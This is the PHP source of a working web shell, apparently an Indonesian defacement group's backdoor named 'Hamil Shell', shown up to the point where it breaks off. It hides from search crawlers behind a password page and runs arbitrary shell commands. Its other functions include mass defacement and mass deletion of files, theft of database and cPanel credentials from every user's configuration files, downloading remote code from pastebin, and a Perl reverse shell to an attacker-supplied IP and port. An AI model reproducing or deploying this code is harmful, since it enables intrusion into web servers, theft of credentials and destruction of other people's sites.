<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$auth_pass = "cda2c99fbf5e19f20d331299c15a4491"; // default:indonesia
$color = "cyan";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>Hamil Shell</title>
<body>
<link href='http://fonts.googleapis.com/css?family=Iceberg'rel='stylesheet' type='text/css'>
<style type="text/css">
html {
	margin: 20px auto;
	background: #1A1C1F;
	color: green;
	text-align: center;
}
header {
	color: #B0B0B0;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: #FF0000;
	background: #1A1C1F;
	border-color: red;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header><br><br><br><br><br><br>
<font style="color:#F0F0F0;text-align: center;text-shadow: 0 0 3px #FEFEFE, 0px 0px 5px #FFFFFF,0 0 5px #FFFFFF,0 0 5px #CFCBCB;">
<font size="1">
<pre> d8,      d8b
                           d8P                `8P       88P
                        d888888P                       d88
  88bd88b d8888b .d888b,  ?88'  ?88   d8P      88b d888888
  88P'  `d8b_,dP ?8b,     88P   d88   88       88Pd8P' ?88
 d88     88b       `?8b   88b   ?8(  d88      d88 88b  ,88b
d88'     `?888P'`?888P'   `?8b  `?88P'?8b    d88' `?88P'`88b▀
	    </pre></font>
	    
	<pre>
<font style="color:white;text-align: center;text-shadow: 0 0 3px #EE3333, 0px 0px 5px #F03D3D,0 0 5px #FF0000,0 0 5px #FF0000;">
<font face="Iceberg"size="5">Mr.r3NduX69 ONLY
</pre>
</header>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>[ Tytd SheLL ]</title>
<link href='http://fonts.googleapis.com/css?family=Iceberg'rel='stylesheet' type='text/css'> 
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
html {
    background:black;
    color:#FFFFFF;
    font-family: 'Iceberg';
	font-size: 12px;
	width: 100%;
}
li {
	display: inline;
	margin: 2px;
	padding: 2px;
}

 #menu{
	background:black;
	margin:9px 3px 4px 2px;
}
#menu a{
	padding:4px 19px;
	margin:0;
	background:#1A1C1F;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
#menu a:hover{
	background:#1A1C1F;
	border-bottom:1px solid #FFAE00;
	border-top:1px solid #FF0000;
}
.explore tr:hover{background:#9C9C9C}//abuabu
table tr:first-child{	
	background: #FFFFFF;
	text-align: center;
	color: white;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background:#1A1C1F;//abuabu
	font-family: 'Iceberg';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #FF0000;
}
th {
	padding: 10px;
}
a {
	color: white;
	text-decoration: none;
}
a:hover {
	color: magenta;
	text-decoration: underline;
}
b {
	color:white;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color:white; 
	border: 1px solid red; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Iceberg';
	font-size: 13px;
}
input[type=submit] {
	background: #5E5E5E; //abuabu
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Iceberg';
	font-size: 13px;
	cursor:pointer;
}
textarea {
	border: 1px solid red;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background:#A7A7A7;
	color: #ffffff;
	font-family: 'Iceberg';
	font-size: 13px;
}
select {
	width: 152px;
	background: red; 
	color: blue; 
	border: 1px solid blue; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Iceberg';
	font-size: 13px;
}
option:hover {
	background:red;
	color: #000000;
}
.mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid #ff0000; padding:4px 2px;width:70%;line-height:24px;background:none;box-shadow: 0px 4px 2px white;-webkit-box-shadow: 0px 4px 2px #ff0000;-moz-box-shadow: 0px 4px 2px #ff0000;}
.cgx2 {text-align: center;letter-spacing:1px;font-family: "orbitron";color: #ff0000;font-size:25px;text-shadow: 5px 5px 5px black;}
.infoweb {
	border-right: 1px solid #00FFFF;
}
</style>
</head>
<?php
 
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=blue>".$perm."</font>";
    }
}
function r($dir,$perm) {
    if(!is_readable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=blue>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    $URLs = array();
    foreach($allLinks as $url){
        $exp = explode("/", $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach($array as $domain) {
        echo $domain."\n";
    }
}
function reverse($url) {
    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
          curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_POST, 1);
    $resp = curl_exec($ch);
    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
    $array = explode(",,", $resp);
    unset($array[0]);
    foreach($array as $lnk) {
        $lnk = "http://$lnk";
        $lnk = str_replace(",", "", $lnk);
        echo $lnk."\n";
        ob_flush();
        flush();
    }
        curl_close($ch);
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
    $_COOKIE = idx_ss($_COOKIE);
}
 
if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=red>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=blue>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=blue>NONE</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}

echo '<center><div id="menu">';
echo "<br>";
echo "<br>";
echo "<br>";
echo "<br>";
echo "<font face='Iceberg'size='4'color='white'><pre> d8,      d8b
                           d8P                `8P       88P
                        d888888P                       d88
  88bd88b d8888b .d888b,  ?88'  ?88   d8P      88b d888888
  88P'  `d8b_,dP ?8b,     88P   d88   88       88Pd8P' ?88
 d88     88b       `?8b   88b   ?8(  d88      d88 88b  ,88b
d88'     `?888P'`?888P'   `?8b  `?88P'?8b    d88' `?88P'`88b</pre>";
echo "<br></font><font color='#4EFF00'>";
echo "<center><table border=1 width='600px' bordercolor='gray'>
<td><td align='center'valign='middle'><td width='100px'><font color='white'><center>
<font color='red'>Thanks to :</center>
</font></font></td></td></td>
<td><td align='center' valign='middle'><td width='70%'><font color='white'><marquee> Renjana Restu Anak Mr.r3NduX69 ~ N45HT IndoXploit AndroSec1337 RNC1337</marquee></font></td></td></td>
</table>";
echo "<font size='3'>";
echo "<br>";
echo "<p>";
echo "<li> <a href='?'>Home</a> </li>";
echo "<a style='color: red;' href='?dir=$dir&do=infosys'>Info Sys</a> </li>";
echo "<li> <a href='?dir=$dir&do=upload'>Upload</a> </li>";
echo "<li> <a href='?dir=$dir&do=mass_deface'>Mass Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=mass_delete'>Mass Delete</a> </li>";
echo "<li> <a href='?dir=$dir&do=config'>Config</a> </li>";
echo "<li><a href='?dir=$dir&do=jumping'>Loncat</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpanel'>CP Crack</a><br><br></li>";
echo "<li> <a href='?dir=$dir&do=fake_root'>Fake Root</a> </li>";
echo "<li><br><br> <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> </li>";
echo "<li> <a href='?dir=$dir&do=auto_wp'>Auto Edit Title</a></li>";
echo "<li> <a href='?dir=$dir&do=auto_dwp'>Wp Auto Deface</a> </li>";
echo "<li> <a href='?dir=$dir&do=cpftp_auto'>CFTP AUTO </a> </li>";
echo "<li><a href='?dir=$dir&do=symlink'>Symlink</a> </li>";
echo "<li><br><br><a href='?dir=$dir&do=smtp'>SMTP Grabber</a><br><br> </li>";
echo "<li> <a href='?xp=bypassserver'>Bypass Tool</a> </li>";
echo "<li> <a href='?dir=$dir&do=bconnet'>Back Connect</a> </li>";
echo "<br><br><li> <a style='color: red;' href='?logout=true'>Logout</a> </li>";
echo "<br>";
echo "<br>";
echo "<font size='4'>"; 
echo "</font>";
echo "<hr color='red'>";
echo "<p>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {   
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
    }
    echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]";
echo "<hr color='red'>";

echo "</ul>";
echo "</div>";
if($_GET['logout'] == true) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    echo "<script>window.location='?';</script>";
} elseif($_GET['do'] == 'upload') {
    echo "<center>";
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=blue>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        } else {
            $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
            $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<font color=blue>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $act = "<font color=red>failed to upload file</font>";
            }
        }
    }
    echo "Upload File:
    <form method='post' enctype='multipart/form-data'>
    <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
    <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
    <input type='file' name='ix_file'>
    <input type='submit' value='upload' name='upload'>
    </form>";
    echo $act;
    echo "</center>";
}
function parah($pastebin, $nama_file){
    $usa = file_get_contents("$pastebin");
    $frr = fopen("$nama_file", 'w');
    fwrite($frr, $usa);
}
$xp = @$_GET['xp'];
if($xp == "bypassserver"){
            $config = parah("http://pastebin.com/raw/ATSD5myG", "bypass.php");
       echo '<center><font color =red><a href="bypass.php" target="_blank">Clik Here To Switch Bypass</a><br></font></center>';
       
    } elseif($_GET['do'] == 'bconnet') {
        echo '<div id="login" style="margin-top: 10px; margin-left: 10px;">';
        echo '<form action="?page=bcon" method="get"><input type="hidden" name="page" value="bcon"/>';
        echo 'IP:<br><input type="text" name="ip" value="'.getenv("remote_addr").'" style="margin-top: 5px;"/><br><br>';
        echo 'Port:<input type="submit" value="Connect" style="margin-left: 130px; margin-top: -4px;"/><br><input type="text" name="port" value="666" style="margin-top: 5px;"/>';
        echo '</form>';
        echo '</div>';
        if(isset($_GET['ip']) && isset($_GET['port'])){
            $ip = $_GET['ip'];
            $port = $_GET['port'];
            $bc = fopen("/tmp/bxcon.pl","w");
            fwrite($bc,'#!/usr/bin/perl
use Socket;
$iaddr=inet_aton("'.$ip.'") || die("Error: $!\n");
$paddr=sockaddr_in("'.$port.'", $iaddr) || die("Error: $!\n");
$proto=getprotobyname("tcp");
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);');
            fclose($bc);
            shell_exec("perl /tmp/bxcon.pl");
            unlink("/tmp/bxcon.pl");
        }
    break;
 
 
 
echo '</td>
</tr>
</table>
<br><center>xB1N4RYx ~ 2012</center><br>
</body>
</html>';
function rooting()
{
echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yes</b><br><br>'; }
    else { echo '<b>Basarisil</b><br><br>'; }
}
}
$x = $_GET["x"];
Switch($x){
case "rooting";
    rooting();
    break;
   
    }
        }elseif($_GET['do'] == 'infosys') {

echo '<center><div id="menu" >';
echo "<ul>";
echo "System: <font color=blue>".$kernel."</font><br>";
echo "User: <font color=blue>".$user."</font> (".$uid.") Group: <font color=blue>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=blue>".$ip."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "User: ".$user." (".$uid.") Group: ".$group." (".$gid.")<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "<hr>";

} elseif($_GET['do'] == 'mass_deface') {
    function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=blue>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = sabun_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function sabun_biasa($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=#10FF00>DONE</font>] $dirb/$namafile<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_sabun'] == 'mahal') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        } elseif($_POST['tipe_sabun'] == 'murah') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        }
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Tipe Lonte:</font><br>
    <input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Index File:</font><br>
    <textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.r3NduX69</textarea><br>
    <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
    </form></center>";
    }
    
} elseif($_GET['do'] == 'mass_delete') {
    function hapus_massal($dir,$namafile) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    if(file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif($dirb === '..') {
                    if(file_exists("".dirname($dir)."/$namafile")) {
                        unlink("".dirname($dir)."/$namafile");
                    }
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            if(file_exists($lokasi)) {
                                echo "[<font color=blue>DELETED</font>] $lokasi<br>";
                                unlink($lokasi);
                                $idx = hapus_massal($dirc,$namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        hapus_massal($_POST['d_dir'], $_POST['d_file']);
        echo "</div>";
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
    </form></center>";
    }
} elseif($_GET['do'] == 'config') {
    $etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
    $idx = mkdir("idx_config", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("idx_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_idx) {
                $user_config_dir = "/home/$user_idx/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_idx/.my.cnf" => "cpanel",
                        "/home/$user_idx/.accesshash" => "WHM-accesshash",
                        "/home/$user_idx/public_html/po-content/config.php" => "Popoji",
                        "/home/$user_idx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_idx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_idx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_idx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_idx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_idx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_idx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_idx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_idx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/configuration.php" => "Joomla",
                        "/home/$user_idx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_idx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_idx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_idx/public_html/application/config/database.php" => "Ellislab");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }      
            }
        }  
    }
    echo "<center><a href='?dir=$dir/idx_config'><font color=blue>Done</font></a></center>";
} elseif($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<div class='margin: 5px auto;'>";
    if(preg_match("/hsphere/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $url = str_replace(array("http://","www."), "", strtolower($url));
                $etc = "/etc/passwd";
                $f = fopen($etc,"r");
                while($gets = fgets($f)) {
                    $pecah = explode(":", $gets);
                    $user = $pecah[0];
                    $dir_user = "/hsphere/local/home/$user";
                    if(is_dir($dir_user) === true) {
                        $url_user = $dir_user."/".$url;
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=blue>R</font>] <a href='?dir=$url_user'><font color=lavender>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=blue>RW</font>] <a href='?dir=$url_user'><font color=lavender>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
            $fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
            while($getss = fgets($fp)) {
                echo $getss;
            }
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } elseif(preg_match("/vhosts/", $dir)) {
        $urls = explode("\r\n", $_POST['url']);
        if(isset($_POST['jump'])) {
            echo "<pre>";
            foreach($urls as $url) {
                $web_vh = "/var/www/vhosts/$url/httpdocs";
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=blue>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=blue>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
        } else {
            echo '<center>
                  <form method="post">
                  List Domains: <br>
                  <textarea name="url" style="width: 500px; height: 250px;">';
                  bing("ip:$ip");
            echo  '</textarea><br>
                  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
                  </form></center>';
        }
    } else {
        echo "<pre>";
        $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
        while($passwd = fgets($etc)) {
            if($passwd == '' || !$etc) {
                echo "<font color=red>Can't read /etc/passwd</font>";
            } else {
                preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
                foreach($user_jumping[1] as $user_idx_jump) {
                    $user_jumping_dir = "/home/$user_idx_jump/public_html";
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=blue>R</font>] <a href='?dir=$user_jumping_dir'><font color=lavender>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=blue>RW</font>] <a href='?dir=$user_jumping_dir'><font color=lavender>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
                        if(function_exists('posix_getpwuid')) {
                            $domain_jump = file_get_contents("/etc/named.conf");   
                            if($domain_jump == '') {
                                echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                            } else {
                                preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                                foreach($domains_jump[1] as $dj) {
                                    $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                    $user_jumping_url = $user_jumping_url['name'];
                                    if($user_jumping_url == $user_idx_jump) {
                                        echo " => ( <u>$dj</u> )<br>";
                                        break;
                                    }
                                }
                            }
                        } else {
                            echo "<br>";
                        }
                    }
                }
            }
        }
        if($i == 0) {
        } else {
            echo "<br>Total ada ".$i." Kamar di ".$ip;
        }
        echo "</pre>";
    }
    echo "</div>";
       
} elseif($_GET['do'] == 'auto_edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
